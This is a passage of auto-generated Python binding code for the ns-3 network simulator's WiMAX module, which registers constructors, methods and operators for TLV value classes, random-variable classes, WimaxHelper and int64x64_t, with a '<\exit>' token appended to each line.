cls.add_instance_attribute('name', 'std::string', is_const=False)<\exit>
cls.add_instance_attribute('originalInitialValue', 'ns3::Ptr< ns3::AttributeValue const >', is_const=False)<\exit>
return<\exit>
def register_Ns3TypeIdTraceSourceInformation_methods(root_module, cls):<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::TypeId::TraceSourceInformation const &', 'arg0')])<\exit>
cls.add_instance_attribute('accessor', 'ns3::Ptr< ns3::TraceSourceAccessor const >', is_const=False)<\exit>
cls.add_instance_attribute('help', 'std::string', is_const=False)<\exit>
cls.add_instance_attribute('name', 'std::string', is_const=False)<\exit>
return<\exit>
def register_Ns3U16TlvValue_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::U16TlvValue const &', 'arg0')])<\exit>
cls.add_constructor([param('uint16_t', 'value')])<\exit>
cls.add_constructor([])<\exit>
cls.add_method('Copy',<\exit>
'ns3::U16TlvValue *',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('Deserialize',<\exit>
'uint32_t',<\exit>
[param('ns3::Buffer::Iterator', 'start'), param('uint64_t', 'valueLen')],<\exit>
is_virtual=True)<\exit>
cls.add_method('Deserialize',<\exit>
'uint32_t',<\exit>
[param('ns3::Buffer::Iterator', 'start')])<\exit>
cls.add_method('GetSerializedSize',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('GetValue',<\exit>
'uint16_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('Serialize',<\exit>
'void',<\exit>
[param('ns3::Buffer::Iterator', 'start')],<\exit>
is_const=True, is_virtual=True)<\exit>
return<\exit>
def register_Ns3U32TlvValue_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::U32TlvValue const &', 'arg0')])<\exit>
cls.add_constructor([param('uint32_t', 'value')])<\exit>
cls.add_constructor([])<\exit>
cls.add_method('Copy',<\exit>
'ns3::U32TlvValue *',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('Deserialize',<\exit>
'uint32_t',<\exit>
[param('ns3::Buffer::Iterator', 'start'), param('uint64_t', 'valueLen')],<\exit>
is_virtual=True)<\exit>
cls.add_method('Deserialize',<\exit>
'uint32_t',<\exit>
[param('ns3::Buffer::Iterator', 'start')])<\exit>
cls.add_method('GetSerializedSize',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('GetValue',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('Serialize',<\exit>
'void',<\exit>
[param('ns3::Buffer::Iterator', 'start')],<\exit>
is_const=True, is_virtual=True)<\exit>
return<\exit>
def register_Ns3U8TlvValue_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::U8TlvValue const &', 'arg0')])<\exit>
cls.add_constructor([param('uint8_t', 'value')])<\exit>
cls.add_constructor([])<\exit>
cls.add_method('Copy',<\exit>
'ns3::U8TlvValue *',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('Deserialize',<\exit>
'uint32_t',<\exit>
[param('ns3::Buffer::Iterator', 'start'), param('uint64_t', 'valueLen')],<\exit>
is_virtual=True)<\exit>
cls.add_method('Deserialize',<\exit>
'uint32_t',<\exit>
[param('ns3::Buffer::Iterator', 'start')])<\exit>
cls.add_method('GetSerializedSize',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('GetValue',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('Serialize',<\exit>
'void',<\exit>
[param('ns3::Buffer::Iterator', 'start')],<\exit>
is_const=True, is_virtual=True)<\exit>
return<\exit>
def register_Ns3UcdChannelEncodings_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::UcdChannelEncodings const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_method('GetBwReqOppSize',<\exit>
'uint16_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetFrequency',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetRangReqOppSize',<\exit>
'uint16_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetSize',<\exit>
'uint16_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('Read',<\exit>
'ns3::Buffer::Iterator',<\exit>
[param('ns3::Buffer::Iterator', 'start')])<\exit>
cls.add_method('SetBwReqOppSize',<\exit>
'void',<\exit>
[param('uint16_t', 'bwReqOppSize')])<\exit>
cls.add_method('SetFrequency',<\exit>
'void',<\exit>
[param('uint32_t', 'frequency')])<\exit>
cls.add_method('SetRangReqOppSize',<\exit>
'void',<\exit>
[param('uint16_t', 'rangReqOppSize')])<\exit>
cls.add_method('Write',<\exit>
'ns3::Buffer::Iterator',<\exit>
[param('ns3::Buffer::Iterator', 'start')],<\exit>
is_const=True)<\exit>
cls.add_method('DoRead',<\exit>
'ns3::Buffer::Iterator',<\exit>
[param('ns3::Buffer::Iterator', 'start')],<\exit>
is_pure_virtual=True, visibility='private', is_virtual=True)<\exit>
cls.add_method('DoWrite',<\exit>
'ns3::Buffer::Iterator',<\exit>
[param('ns3::Buffer::Iterator', 'start')],<\exit>
is_pure_virtual=True, is_const=True, visibility='private', is_virtual=True)<\exit>
return<\exit>
def register_Ns3UniformVariable_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::UniformVariable const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('double', 's'), param('double', 'l')])<\exit>
cls.add_method('GetInteger',<\exit>
'uint32_t',<\exit>
[param('uint32_t', 's'), param('uint32_t', 'l')])<\exit>
cls.add_method('GetValue',<\exit>
'double',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetValue',<\exit>
'double',<\exit>
[param('double', 's'), param('double', 'l')])<\exit>
return<\exit>
def register_Ns3VectorTlvValue_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::VectorTlvValue const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_method('Add',<\exit>
'void',<\exit>
[param('ns3::Tlv const &', 'val')])<\exit>
cls.add_method('Begin',<\exit>
'__gnu_cxx::__normal_iterator< ns3::Tlv * const *, std::vector< ns3::Tlv * > >',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('Copy',<\exit>
'ns3::VectorTlvValue *',<\exit>
[],<\exit>
is_pure_virtual=True, is_const=True, is_virtual=True)<\exit>
cls.add_method('Deserialize',<\exit>
'uint32_t',<\exit>
[param('ns3::Buffer::Iterator', 'start'), param('uint64_t', 'valueLength')],<\exit>
is_pure_virtual=True, is_virtual=True)<\exit>
cls.add_method('End',<\exit>
'__gnu_cxx::__normal_iterator< ns3::Tlv * const *, std::vector< ns3::Tlv * > >',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetSerializedSize',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('Serialize',<\exit>
'void',<\exit>
[param('ns3::Buffer::Iterator', 'start')],<\exit>
is_const=True, is_virtual=True)<\exit>
return<\exit>
def register_Ns3WeibullVariable_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::WeibullVariable const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('double', 'm')])<\exit>
cls.add_constructor([param('double', 'm'), param('double', 's')])<\exit>
cls.add_constructor([param('double', 'm'), param('double', 's'), param('double', 'b')])<\exit>
return<\exit>
def register_Ns3WimaxHelper_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::WimaxHelper const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_method('CreateBSScheduler',<\exit>
'ns3::Ptr< ns3::BSScheduler >',<\exit>
[param('ns3::WimaxHelper::SchedulerType', 'schedulerType')])<\exit>
cls.add_method('CreatePhy',<\exit>
'ns3::Ptr< ns3::WimaxPhy >',<\exit>
[param('ns3::WimaxHelper::PhyType', 'phyType')])<\exit>
cls.add_method('CreatePhy',<\exit>
'ns3::Ptr< ns3::WimaxPhy >',<\exit>
[param('ns3::WimaxHelper::PhyType', 'phyType'), param('char *', 'SNRTraceFilePath'), param('bool', 'activateLoss')])<\exit>
cls.add_method('CreatePhyWithoutChannel',<\exit>
'ns3::Ptr< ns3::WimaxPhy >',<\exit>
[param('ns3::WimaxHelper::PhyType', 'phyType')])<\exit>
cls.add_method('CreatePhyWithoutChannel',<\exit>
'ns3::Ptr< ns3::WimaxPhy >',<\exit>
[param('ns3::WimaxHelper::PhyType', 'phyType'), param('char *', 'SNRTraceFilePath'), param('bool', 'activateLoss')])<\exit>
cls.add_method('CreateServiceFlow',<\exit>
'ns3::ServiceFlow',<\exit>
[param('ns3::ServiceFlow::Direction', 'direction'), param('ns3::ServiceFlow::SchedulingType', 'schedulinType'), param('ns3::IpcsClassifierRecord', 'classifier')])<\exit>
cls.add_method('CreateUplinkScheduler',<\exit>
'ns3::Ptr< ns3::UplinkScheduler >',<\exit>
[param('ns3::WimaxHelper::SchedulerType', 'schedulerType')])<\exit>
cls.add_method('EnableAsciiForConnection',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::OutputStreamWrapper >', 'oss'), param('uint32_t', 'nodeid'), param('uint32_t', 'deviceid'), param('char *', 'netdevice'), param('char *', 'connection')],<\exit>
is_static=True)<\exit>
cls.add_method('EnableLogComponents',<\exit>
'void',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('Install',<\exit>
'ns3::NetDeviceContainer',<\exit>
[param('ns3::NodeContainer', 'c'), param('ns3::WimaxHelper::NetDeviceType', 'type'), param('ns3::WimaxHelper::PhyType', 'phyType'), param('ns3::WimaxHelper::SchedulerType', 'schedulerType')])<\exit>
cls.add_method('Install',<\exit>
'ns3::NetDeviceContainer',<\exit>
[param('ns3::NodeContainer', 'c'), param('ns3::WimaxHelper::NetDeviceType', 'deviceType'), param('ns3::WimaxHelper::PhyType', 'phyType'), param('ns3::Ptr< ns3::WimaxChannel >', 'channel'), param('ns3::WimaxHelper::SchedulerType', 'schedulerType')])<\exit>
cls.add_method('Install',<\exit>
'ns3::NetDeviceContainer',<\exit>
[param('ns3::NodeContainer', 'c'), param('ns3::WimaxHelper::NetDeviceType', 'deviceType'), param('ns3::WimaxHelper::PhyType', 'phyType'), param('ns3::WimaxHelper::SchedulerType', 'schedulerType'), param('double', 'frameDuration')])<\exit>
cls.add_method('Install',<\exit>
'ns3::Ptr< ns3::WimaxNetDevice >',<\exit>
[param('ns3::Ptr< ns3::Node >', 'node'), param('ns3::WimaxHelper::NetDeviceType', 'deviceType'), param('ns3::WimaxHelper::PhyType', 'phyType'), param('ns3::Ptr< ns3::WimaxChannel >', 'channel'), param('ns3::WimaxHelper::SchedulerType', 'schedulerType')])<\exit>
cls.add_method('SetPropagationLossModel',<\exit>
'void',<\exit>
[param('ns3::SimpleOfdmWimaxChannel::PropModel', 'propagationModel')])<\exit>
cls.add_method('EnableAsciiInternal',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::OutputStreamWrapper >', 'stream'), param('std::string', 'prefix'), param('ns3::Ptr< ns3::NetDevice >', 'nd'), param('bool', 'explicitFilename')],<\exit>
visibility='private', is_virtual=True)<\exit>
cls.add_method('EnablePcapInternal',<\exit>
'void',<\exit>
[param('std::string', 'prefix'), param('ns3::Ptr< ns3::NetDevice >', 'nd'), param('bool', 'explicitFilename'), param('bool', 'promiscuous')],<\exit>
visibility='private', is_virtual=True)<\exit>
return<\exit>
def register_Ns3ZetaVariable_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::ZetaVariable const &', 'arg0')])<\exit>
cls.add_constructor([param('double', 'alpha')])<\exit>
cls.add_constructor([])<\exit>
return<\exit>
def register_Ns3ZipfVariable_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::ZipfVariable const &', 'arg0')])<\exit>
cls.add_constructor([param('long int', 'N'), param('double', 'alpha')])<\exit>
cls.add_constructor([])<\exit>
return<\exit>
def register_Ns3Empty_methods(root_module, cls):<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::empty const &', 'arg0')])<\exit>
return<\exit>
def register_Ns3Int64x64_t_methods(root_module, cls):<\exit>
cls.add_binary_comparison_operator('!=')<\exit>
cls.add_inplace_numeric_operator('+=', param('ns3::int64x64_t const &', 'right'))<\exit>
cls.add_binary_numeric_operator('*', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('long long unsigned int const', 'right'))<\exit>
cls.add_binary_numeric_operator('*', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('long unsigned int const', 'right'))<\exit>
cls.add_binary_numeric_operator('*', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('unsigned int const', 'right'))<\exit>
cls.add_binary_numeric_operator('*', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('short unsigned int const', 'right'))<\exit>
cls.add_binary_numeric_operator('*', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('unsigned char const', 'right'))<\exit>
cls.add_binary_numeric_operator('*', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('long long int const', 'right'))<\exit>
cls.add_binary_numeric_operator('*', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('long int const', 'right'))<\exit>
cls.add_binary_numeric_operator('*', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('int const', 'right'))<\exit>
cls.add_binary_numeric_operator('*', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('short int const', 'right'))<\exit>
cls.add_binary_numeric_operator('*', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('signed char const', 'right'))<\exit>
cls.add_binary_numeric_operator('*', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('double const', 'right'))<\exit>
cls.add_binary_numeric_operator('*', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('ns3::int64x64_t const &', 'right'))<\exit>
cls.add_binary_numeric_operator('+', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('long long unsigned int const', 'right'))<\exit>
cls.add_binary_numeric_operator('+', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('long unsigned int const', 'right'))<\exit>
cls.add_binary_numeric_operator('+', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('unsigned int const', 'right'))<\exit>
cls.add_binary_numeric_operator('+', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('short unsigned int const', 'right'))<\exit>
cls.add_binary_numeric_operator('+', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('unsigned char const', 'right'))<\exit>
cls.add_binary_numeric_operator('+', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('long long int const', 'right'))<\exit>
cls.add_binary_numeric_operator('+', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('long int const', 'right'))<\exit>
cls.add_binary_numeric_operator('+', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('int const', 'right'))<\exit>
cls.add_binary_numeric_operator('+', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('short int const', 'right'))<\exit>
cls.add_binary_numeric_operator('+', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('signed char const', 'right'))<\exit>
cls.add_binary_numeric_operator('+', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('double const', 'right'))<\exit>
cls.add_binary_numeric_operator('+', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('ns3::int64x64_t const &', 'right'))<\exit>
cls.add_binary_numeric_operator('-', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('long long unsigned int const', 'right'))<\exit>
cls.add_binary_numeric_operator('-', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('long unsigned int const', 'right'))<\exit>
cls.add_binary_numeric_operator('-', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('unsigned int const', 'right'))<\exit>
cls.add_binary_numeric_operator('-', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('short unsigned int const', 'right'))<\exit>
cls.add_binary_numeric_operator('-', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('unsigned char const', 'right'))<\exit>
cls.add_binary_numeric_operator('-', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('long long int const', 'right'))<\exit>
cls.add_binary_numeric_operator('-', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('long int const', 'right'))<\exit>
cls.add_binary_numeric_operator('-', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('int const', 'right'))<\exit>
cls.add_binary_numeric_operator('-', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('short int const', 'right'))<\exit>
cls.add_binary_numeric_operator('-', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('signed char const', 'right'))<\exit>
cls.add_binary_numeric_operator('-', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('double const', 'right'))<\exit>
cls.add_unary_numeric_operator('-')<\exit>
cls.add_binary_numeric_operator('-', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('ns3::int64x64_t const &', 'right'))<\exit>
cls.add_binary_numeric_operator('/', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('long long unsigned int const', 'right'))<\exit>
cls.add_binary_numeric_operator('/', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('long unsigned int const', 'right'))<\exit>
cls.add_binary_numeric_operator('/', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('unsigned int const', 'right'))<\exit>
cls.add_binary_numeric_operator('/', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('short unsigned int const', 'right'))<\exit>
cls.add_binary_numeric_operator('/', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('unsigned char const', 'right'))<\exit>
cls.add_binary_numeric_operator('/', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('long long int const', 'right'))<\exit>
cls.add_binary_numeric_operator('/', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('long int const', 'right'))<\exit>
cls.add_binary_numeric_operator('/', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('int const', 'right'))<\exit>
cls.add_binary_numeric_operator('/', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('short int const', 'right'))<\exit>
cls.add_binary_numeric_operator('/', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('signed char const', 'right'))<\exit>
cls.add_binary_numeric_operator('/', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('double const', 'right'))<\exit>
cls.add_binary_numeric_operator('/', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('ns3::int64x64_t const &', 'right'))<\exit>
cls.add_binary_comparison_operator('<')<\exit>
cls.add_binary_comparison_operator('>')<\exit>
cls.add_inplace_numeric_operator('*=', param('ns3::int64x64_t const &', 'right'))<\exit>
cls.add_inplace_numeric_operator('-=', param('ns3::int64x64_t const &', 'right'))<\exit>
cls.add_inplace_numeric_operator('/=', param('ns3::int64x64_t const &', 'right'))<\exit>
cls.add_output_stream_operator()<\exit>
cls.add_binary_comparison_operator('<=')<\exit>
cls.add_binary_comparison_operator('==')<\exit>
cls.add_binary_comparison_operator('>=')<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('double', 'v')])<\exit>
cls.add_constructor([param('int', 'v')])<\exit>
cls.add_constructor([param('long int', 'v')])<\exit>
cls.add_constructor([param('long long int', 'v')])<\exit>
cls.add_constructor([param('unsigned int', 'v')])<\exit>
cls.add_constructor([param('long unsigned int', 'v')])<\exit>
cls.add_constructor([param('long long unsigned int', 'v')])<\exit>
cls.add_constructor([param('int64_t', 'hi'), param('uint64_t', 'lo')])<\exit>
cls.add_constructor([param('ns3::int64x64_t const &', 'o')])<\exit>
cls.add_method('GetDouble',<\exit>
'double',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetHigh',<\exit>
'int64_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetLow',<\exit>
'uint64_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('Invert',<\exit>
'ns3::int64x64_t',<\exit>
[param('uint64_t', 'v')],<\exit>
is_static=True)<\exit>
cls.add_method('MulByInvert',<\exit>
'void',<\exit>
[param('ns3::int64x64_t const &', 'o')])<\exit>
return<\exit>
def register_Ns3SimpleOfdmSendParam_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::simpleOfdmSendParam const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::bvec const &', 'fecBlock'), param('uint32_t', 'burstSize'), param('bool', 'isFirstBlock'), param('uint64_t', 'Frequency'), param('ns3::WimaxPhy::ModulationType', 'modulationType'), param('uint8_t', 'direction'), param('double', 'rxPowerDbm')])<\exit>
cls.add_constructor([param('uint32_t', 'burstSize'), param('bool', 'isFirstBlock'), param('uint64_t', 'Frequency'), param('ns3::WimaxPhy::ModulationType', 'modulationType'), param('uint8_t', 'direction'), param('double', 'rxPowerDbm'), param('ns3::Ptr< ns3::PacketBurst >', 'burst')])<\exit>
cls.add_method('GetBurst',<\exit>
'ns3::Ptr< ns3::PacketBurst >',<\exit>
[])<\exit>
cls.add_method('GetBurstSize',<\exit>
'uint32_t',<\exit>
[])<\exit>
cls.add_method('GetDirection',<\exit>
'uint8_t',<\exit>
[])<\exit>
cls.add_method('GetFecBlock',<\exit>
'ns3::bvec',<\exit>
[])<\exit>
cls.add_method('GetFrequency',<\exit>
'uint64_t',<\exit>
[])<\exit>
cls.add_method('GetIsFirstBlock',<\exit>
'bool',<\exit>
[])<\exit>
cls.add_method('GetModulationType',<\exit>
'ns3::WimaxPhy::ModulationType',<\exit>
[])<\exit>
cls.add_method('GetRxPowerDbm',<\exit>
'double',<\exit>
[])<\exit>
cls.add_method('SetBurstSize',<\exit>
'void',<\exit>
[param('uint32_t', 'burstSize')])<\exit>
cls.add_method('SetDirection',<\exit>
'void',<\exit>
[param('uint8_t', 'direction')])<\exit>
cls.add_method('SetFecBlock',<\exit>
'void',<\exit>
[param('ns3::bvec const &', 'fecBlock')])<\exit>
cls.add_method('SetFrequency',<\exit>
'void',<\exit>
[param('uint64_t', 'Frequency')])<\exit>
cls.add_method('SetIsFirstBlock',<\exit>
'void',<\exit>
[param('bool', 'isFirstBlock')])<\exit>
cls.add_method('SetModulationType',<\exit>
'void',<\exit>
[param('ns3::WimaxPhy::ModulationType', 'modulationType')])<\exit>
cls.add_method('SetRxPowerDbm',<\exit>
'void',<\exit>
[param('double', 'rxPowerDbm')])<\exit>
return<\exit>
def register_Ns3Chunk_methods(root_module, cls):<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::Chunk const &', 'arg0')])<\exit>
cls.add_method('Deserialize',<\exit>
'uint32_t',<\exit>
[param('ns3::Buffer::Iterator', 'start')],<\exit>
is_pure_virtual=True, is_virtual=True)<\exit>
cls.add_method('GetTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('Print',<\exit>
'void',<\exit>
[param('std::ostream &', 'os')],<\exit>
is_pure_virtual=True, is_const=True, is_virtual=True)<\exit>
return<\exit>
def register_Ns3ClassificationRuleVectorTlvValue_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::ClassificationRuleVectorTlvValue const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_method('Copy',<\exit>
'ns3::ClassificationRuleVectorTlvValue *',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('Deserialize',<\exit>
'uint32_t',<\exit>
[param('ns3::Buffer::Iterator', 'start'), param('uint64_t', 'valueLength')],<\exit>
is_virtual=True)<\exit>
return<\exit>
def register_Ns3ConstantVariable_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::ConstantVariable const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('double', 'c')])<\exit>
cls.add_method('SetConstant',<\exit>
'void',<\exit>
[param('double', 'c')])<\exit>
return<\exit>
def register_Ns3CsParamVectorTlvValue_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::CsParamVectorTlvValue const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_method('Copy',<\exit>
'ns3::CsParamVectorTlvValue *',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('Deserialize',<\exit>
'uint32_t',<\exit>
[param('ns3::Buffer::Iterator', 'start'), param('uint64_t', 'valueLength')],<\exit>
is_virtual=True)<\exit>
return<\exit>
def register_Ns3DeterministicVariable_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::DeterministicVariable const &', 'arg0')])<\exit>
cls.add_constructor([param('double *', 'd'), param('uint32_t', 'c')])<\exit>
return<\exit>
def register_Ns3EmpiricalVariable_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::EmpiricalVariable const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_method('CDF',<\exit>
'void',<\exit>
[param('double', 'v'), param('double', 'c')])<\exit>
return<\exit>
def register_Ns3ErlangVariable_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::ErlangVariable const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('unsigned int', 'k'), param('double', 'lambda')])<\exit>
cls.add_method('GetValue',<\exit>
'double',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetValue',<\exit>
'double',<\exit>
[param('unsigned int', 'k'), param('double', 'lambda')],<\exit>
is_const=True)<\exit>
return<\exit>
def register_Ns3ExponentialVariable_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::ExponentialVariable const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('double', 'm')])<\exit>
cls.add_constructor([param('double', 'm'), param('double', 'b')])<\exit>
return<\exit>
def register_Ns3GammaVariable_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::GammaVariable const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('double', 'alpha'), param('double', 'beta')])<\exit>
cls.add_method('GetValue',<\exit>
'double',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetValue',<\exit>
'double',<\exit>
[param('double', 'alpha'), param('double', 'beta')],<\exit>
is_const=True)<\exit>
return<\exit>
def register_Ns3Header_methods(root_module, cls):<\exit>
cls.add_output_stream_operator()<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::Header const &', 'arg0')])<\exit>
cls.add_method('Deserialize',<\exit>
'uint32_t',<\exit>
[param('ns3::Buffer::Iterator', 'start')],<\exit>
is_pure_virtual=True, is_virtual=True)<\exit>
cls.add_method('GetSerializedSize',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_pure_virtual=True, is_const=True, is_virtual=True)<\exit>
cls.add_method('GetTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('Print',<\exit>
'void',<\exit>
[param('std::ostream &', 'os')],<\exit>
is_pure_virtual=True, is_const=True, is_virtual=True)<\exit>
cls.add_method('Serialize',<\exit>
'void',<\exit>
[param('ns3::Buffer::Iterator', 'start')],<\exit>
is_pure_virtual=True, is_const=True, is_virtual=True)<\exit>
return<\exit>
def register_Ns3IntEmpiricalVariable_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::IntEmpiricalVariable const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
return<\exit>
def register_Ns3Ipv4AddressTlvValue_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::Ipv4AddressTlvValue const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_method('Add',<\exit>
'void',<\exit>
[param('ns3::Ipv4Address', 'address'), param('ns3::Ipv4Mask', 'Mask')])<\exit>
cls.add_method('Begin',<\exit>
'__gnu_cxx::__normal_iterator< ns3::Ipv4AddressTlvValue::ipv4Addr const *, std::vector< ns3::Ipv4AddressTlvValue::ipv4Addr > >',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('Copy',<\exit>
'ns3::Ipv4AddressTlvValue *',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('Deserialize',<\exit>
'uint32_t',<\exit>
[param('ns3::Buffer::Iterator', 'start'), param('uint64_t', 'valueLength')],<\exit>
is_virtual=True)<\exit>
cls.add_method('End',<\exit>
'__gnu_cxx::__normal_iterator< ns3::Ipv4AddressTlvValue::ipv4Addr const *, std::vector< ns3::Ipv4AddressTlvValue::ipv4Addr > >',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetSerializedSize',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('Serialize',<\exit>
'void',<\exit>
[param('ns3::Buffer::Iterator', 'start')],<\exit>
is_const=True, is_virtual=True)<\exit>
return<\exit>
def register_Ns3Ipv4AddressTlvValueIpv4Addr_methods(root_module, cls):<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::Ipv4AddressTlvValue::ipv4Addr const &', 'arg0')])<\exit>
cls.add_instance_attribute('Address', 'ns3::Ipv4Address', is_const=False)<\exit>
cls.add_instance_attribute('Mask', 'ns3::Ipv4Mask', is_const=False)<\exit>
return<\exit>
